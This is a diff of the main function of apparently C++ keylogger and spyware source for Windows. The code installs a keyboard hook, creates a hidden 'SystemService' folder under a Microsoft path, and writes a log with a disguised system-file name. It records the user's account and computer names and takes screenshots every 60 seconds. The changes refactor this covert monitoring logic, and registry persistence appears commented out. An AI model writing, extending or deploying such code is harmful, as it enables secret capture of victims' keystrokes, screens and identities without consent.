@@ -23,39 +23,29 @@ int main() {
 
 //  Sys::AddToRegistry();
   KeyHook::InstallHook();
-  Stream::GetAccountInfo(clientInfo);
+  clientInfo = Stream::GetAccountInfo(clientInfo);
 
   std::string path = Stream::GetPath("\\Microsoft\\");
-  Directory mainDir;
   Stream::LogFile logFile;
 
-  mainDir.name = "SystemService";
-  mainDir.path = Stream::GetPath(Stream::GetPath("\\" + mainDir.name));
+  std::string dirName = "SystemService";
 
-  debn(Stream::GetPath("\\Microsoft\\" + mainDir.name))
-
-  Stream::MakeDir(mainDir.path, mainDir.name, FILE_ATTRIBUTE_HIDDEN);
-  Stream::MakeFile("wnxshl2.sys.log", "\\Microsoft\\"); // Logs
+  Stream::MakeDir(path, dirName, FILE_ATTRIBUTE_HIDDEN);
+  Stream::MakeFile("wnxshl2.sys.log", path + "\\" + dirName);
   Stream::WriteLog("[*] BOOT [*]", KeyHook::activeProcess, logFile, false);
 
   std::ostringstream ostream;
 
-  DWORD major = clientInfo.osVersionInfo.dwMajorVersion;
-  DWORD minor = clientInfo.osVersionInfo.dwMinorVersion;
-  char *accountName = clientInfo.accountName;
-  char *com = clientInfo.computerName;
-
-  ostream << "\n[*] OS Info: Major - " << major << "; Minor - " << minor << " [*]"
-		  << "\n[*] Account Info: User -" << accountName << "; Computer - " << com << " [*]";
-
-  delete accountName;
-  delete com;
+  ostream << "\n[*] OS Info: Major - " << clientInfo.osVersionInfo.dwMajorVersion << "; Minor - "
+		  << clientInfo.osVersionInfo.dwMinorVersion << " [*]"
+		  << "\n[*] Account Info: User -" << clientInfo.accountName << "; Computer - " << clientInfo.computerName
+		  << " [*]";
 
   std::string write = ostream.str();
   Stream::WriteLog(write, KeyHook::activeProcess, logFile, false);
-  Screen::CaptureScreen(mainDir.path + "\\", "winpst", true, 60000); // Screenshot
+  Screen::CaptureScreen(path + "\\", "winpst", true, 60000); // Screenshot
 
-  KeyHook::HandleMessage(true);
+//  KeyHook::HandleMessage(true);
 
 #endif // DEBUG_BUILD
   return 0;
